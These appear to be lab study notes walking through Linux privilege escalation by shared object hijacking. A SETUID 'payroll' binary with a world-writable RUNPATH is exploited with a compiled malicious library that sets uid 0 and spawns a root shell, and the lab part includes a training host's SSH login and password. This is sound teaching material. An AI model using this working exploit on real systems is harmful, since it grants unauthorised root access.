# Shared Object Hijacking

Consider a case with the following SETUID binary

ls -la payroll

-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll

1) Use ldd to print the shared object required by the binary

ldd payroll

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)

2) Inspect libraries using readelf

--> Libraries in RUNPATH folder are given preference over other folders.

readelf -d payroll  | grep PATH

 0x000000000000001d (RUNPATH)            Library runpath: [/development]

3) Exploit the misconfiguration

The configuration allows the loading of libraries from the /development folder, which is writable by all users. This misconfiguration can be exploited by placing a malicious library in /development,

ls -la /development/

total 8
drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../

cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so

ldd payroll

linux-vdso.so.1 (0x00007ffd22bbc000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)

vi root.c

#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 

gcc root.c -fPIC -shared -o /development/libshared.so

````
./payroll 
````

***************Inlane Freight Employee Database***************

Malicious library loaded
````
# id
uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)
````

## LAB

ssh htb-student@10.129.220.117
Academy_LLPE!

find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
-rwsr-xr-x 1 root root 16728 Sep  1  2020 /home/htb-student/shared_obj_hijack/payroll

ldd shared_obj_hijack/payroll

	linux-vdso.so.1 =>  (0x00007ffe5d4ea000)
	libshared.so => /development/libshared.so (0x00007fe0cbcc8000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe0cb8fe000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fe0cbeca000)

readelf -d shared_obj_hijack/payroll  | grep PATH

 0x000000000000001d (RUNPATH)            Library runpath: [/development]

cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so

ldd shared_obj_hijack/payroll
	linux-vdso.so.1 =>  (0x00007ffc639dd000)
	libshared.so => /development/libshared.so (0x00007f6de0915000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f6de054b000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f6de0b17000)

vi root.c

#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 

gcc root.c -fPIC -shared -o /development/libshared.so

./shared_obj_hijack/payroll

***************Inlane Freight Employee Database***************

Malicious library loaded
# id
uid=0(root) gid=1008(htb-student) groups=1008(htb-student)
# 

ldd --version
ldd (Ubuntu GLIBC 2.23-0ubuntu10) 2.23
Copyright (C) 2016 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
Written by Roland McGrath and Ulrich Drepper.
